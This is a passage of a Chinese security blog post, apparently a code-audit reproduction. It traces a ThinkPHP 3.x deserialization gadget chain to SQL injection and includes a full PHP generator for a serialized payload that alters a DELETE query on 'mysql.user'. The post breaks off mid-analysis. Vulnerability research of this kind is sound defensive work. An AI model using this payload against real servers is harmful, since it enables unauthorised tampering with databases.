@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="thinkphp3.x" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Reference： https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;S3Un1EM-cftFXr8hxG4qfA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tp3.x sql注入复现">
+<meta property="og:url" content="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="Reference： https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;S3Un1EM-cftFXr8hxG4qfA">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/1.png">
+<meta property="og:image" content="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/2.png">
+<meta property="og:image" content="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/3.png">
+<meta property="article:published_time" content="2021-03-01T15:41:00.000Z">
+<meta property="article:modified_time" content="2021-04-23T05:57:20.805Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="codeAudit">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/"/>
+
+
+
+
+
+  <title>tp3.x sql注入复现 | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">tp3.x sql注入复现</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-01T23:41:00+08:00">
+                2021-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeAudit/" itemprop="url" rel="index">
+                    <span itemprop="name">codeAudit</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeAudit/thinkphp3/" itemprop="url" rel="index">
+                    <span itemprop="name">thinkphp3</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Reference：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p>
+<span id="more"></span>
+
+
+
+<br>
+
+<h2 id="反序列化起点"><a href="#反序列化起点" class="headerlink" title="反序列化起点"></a>反序列化起点</h2><p><strong>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p>
+<p>line 636 - line 642</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;img) || <span class="keyword">$this</span>-&gt;img-&gt;destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>在反序列化中，所有成员属性均可控。即 <code>$this-&gt;img</code> 可控。</p>
+<p>如此一来，即可 <strong>无参数式</strong> 调用 TP 下任意类的 <em>destroy</em> 方法</p>
+<br>
+
+<h2 id="destroy-跳板"><a href="#destroy-跳板" class="headerlink" title="destroy()  跳板"></a>destroy()  跳板</h2><p>搜索 destroy 方法，找到三个存在 destroy 的位置：</p>
+<img src="/2021/03/01/2021-02-28-tp3-x-sql/1.png" style="width:500px;">
+
+
+
+<p>其中两个类 <code>Think\Session\Driver\Mysqli</code>类 和 <code>Think\Session\Driver\Db</code>类  是直接调用 <em>mysqli_query</em> 进行数据库操作的，如下：</p>
+<br>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hander</span> = is_array(<span class="keyword">$this</span>-&gt;hander) ? <span class="keyword">$this</span>-&gt;hander[<span class="number">0</span>] : <span class="keyword">$this</span>-&gt;hander;</span><br><span class="line">    mysqli_query(<span class="variable">$hander</span>, <span class="string">&quot;DELETE FROM &quot;</span> . <span class="keyword">$this</span>-&gt;sessionTable . <span class="string">&quot; WHERE session_id = &#x27;<span class="subst">$sessID</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_affected_rows(<span class="variable">$hander</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>由于 <em>mysqli_query</em> 中 <code>$hander</code> 的值取决与 <code>$this-&gt;hander</code>，但是就算我们在序列化 POC 中进行 <em>mysqli_connect</em> ，句柄移植之后是不可用的，所以这个点只能放弃。</p>
+<br>
+
+<p>这里注意下， php7 调用有参数函数时必须传参，不然会报错。但 php5 则可不传参数调用有参数函数。</p>
+<br>
+
+<p>转头看第三个类 <code>Think\Session\Driver\Memcache</code> </p>
+<br>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handle-&gt;delete(<span class="keyword">$this</span>-&gt;sessionName . <span class="variable">$sessID</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>由于 <code>$this-&gt;handle</code> 可控，我们可以调用任意类的 <em>delete</em> 方法。</p>
+<p>并且由于跳到 <em>destroy</em> 方法时是 <strong>无参数调用</strong>。这里的 <em>$sessID</em> 是个无效的形参。用这个无效的形参去调用别的函数时，传入的参数会无效。所以这里调用 <em>delete</em> 的形参还是不可控的</p>
+<br>
+
+<h2 id="Model-delete-跳板"><a href="#Model-delete-跳板" class="headerlink" title="Model delete() 跳板"></a>Model delete() 跳板</h2><p>全局搜索 <code>function delete</code>。找到 <code>Think\Model</code> 类</p>
+<br>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pk</span> = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>])) &#123;</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;_parseOptions();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......    </span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;delete(<span class="variable">$options</span>);</span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>$this-&gt;getPK()</code>函数仅仅只是 <code>return $this-&gt;pk;</code></p>
+<p>所以 <em>$pk</em> 的值为 <em>$this-&gt;pk</em></p>
+<br>
+
+<p>可以发现在 <code>if</code> 判断中，如果传入的 <em>$options</em> 为空，则重新调用 <code>$this-&gt;delete()</code> 方法 ，并且传入的参数为 <code>$this-&gt;data[$pk]</code>。这样子 *delete()*方法的形参 <em>$options</em> 就是可控的了。</p>
+<br>
+
+<p>在<em>分析表达式</em> 流程中，重新为 <em>$options</em> 赋值，调用了 <code>$this-&gt;_parseOptions()</code>。该方法将会返回 <code>$this-&gt;options</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><em>分析表达式</em> 流程后还判断了 <em>$options[‘where’]</em> 。需要确保 <em>$options</em> 中有该值</p>
+<br>
+
+<p>程序接着调用了 <code>$this-&gt;db-&gt;delete($options)</code>，其中 <em>$this-&gt;db</em> 可控，并且 <em>$options</em> 可控，全局搜索 <code>function delete</code>。找到 <em>Think\Db\Driver</em> 类。</p>
+<p>至于选择这个类的原因，因为它在后面构造 <em>SQL payload</em> 的时候比较方便。</p>
+<h2 id="Driver-delete-跳板"><a href="#Driver-delete-跳板" class="headerlink" title="Driver delete() 跳板"></a>Driver delete() 跳板</h2><br>
+
+<p><em>Think\Db\Driver</em> 类 <em>delete()</em> 方法主要代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>可是该类为抽象类，无法直接实例化。需要找一个继承它的子类，并且该类没有 *delete()*，这样程序调用的时候才能调用到父类的 <em>delete()</em> 方法。</p>
+<p>最终找到 <em>Think\Db\Driver\Mysql</em>类 作为反序列化的实例化类。</p>
+<br>
+
+<p><code>delete()</code>方法 最终调用了 <code>$this-&gt;execute()</code>，由于此类是专门用作数据库操作的，<code>execute()</code> 中并没有发现能 RCE 的点，也没有发现能当跳板的点。</p>
+<p>不过注意到 <code>execute()</code> 的第一行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>跟进，发现当不存在 <em>$this-&gt;_linkID</em> 时，将会调用 <em>$this-&gt;connect()</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_linkID = <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>跟进，发现该函数使用 <em>PDO</em> 进行数据库连接，并返回了句柄</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">	<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>返回句柄后，<code>execute</code>方法 将会根据 <strong>传入的 sql语句</strong> 执行sql。这里 <strong>传入的sql语句</strong> 就是 <code>delete()</code>方法 中的 <code>$sql</code></p>
+<br>
+
+<h2 id="基本Payload"><a href="#基本Payload" class="headerlink" title="基本Payload"></a>基本Payload</h2><p>至此，以上整个从反序列化到执行SQL注入的流程。根据以上流程，得出基本Payload:</p>
+<p><strong>Payload demo:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个跳板，也可以说是最终执行类</span></span><br><span class="line"><span class="comment">//由于执行类 Db 是抽象类，无法实例化</span></span><br><span class="line"><span class="comment">//遂使用其子类 Mysql进行实例化</span></span><br><span class="line"><span class="comment">//由于 payload 需要调用父类的 delete()</span></span><br><span class="line"><span class="comment">//子类必须没有 delete() 方法</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第二个跳板 <span class="title">Model</span>-&gt;<span class="title">delete</span>()</span><br><span class="line"><span class="title">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">		protected $pk = &#x27;exp&#x27;;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line">			<span class="comment">//$this-&gt;pk 的值需要和 $this-&gt;data 其中一个 key值 一致</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">			<span class="comment">//$this-&gt;data 内容随意，只是过一个 if</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">				<span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line">					<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">				]</span><br><span class="line">			];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">				<span class="comment">//内容随意，也只是过一个 if</span></span><br><span class="line">				<span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">				<span class="comment">//$sql   = &#x27;DELETE FROM &#x27; . $table;</span></span><br><span class="line">				<span class="comment">//SQL 注入语句</span></span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line">				<span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">			];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1) 第一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="comment">//(2) 在这个方法中又调用了 $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span></span><br><span class="line"><span class="comment">//(3) sessionName 必须为空，如果为字符串传入的话，由于 $sessID 没有赋值</span></span><br><span class="line"><span class="comment">//最终调用 $this-&gt;handle-&gt;delete()时将会传入非预期值</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//梦开始的地方</span></span><br><span class="line"><span class="comment">//调用地一个跳板 Memcache-&gt;destroy()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line">		<span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line">	<span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>开启 Debug ，追踪程序执行流程，发现 SQL 语句成功被控制</p>
+<img src="/2021/03/01/2021-02-28-tp3-x-sql/2.png" style="width:500px;">
+
+<br>
+
+<p>但是，由于我们无法知道目标服务器的 Mysql 配置，所以 SQL注入自然是跑不动的。</p>
+<p>仔细查看数据库连接函数 <code>connect</code> 后，发现其 PDO 配置是我们可控的</p>
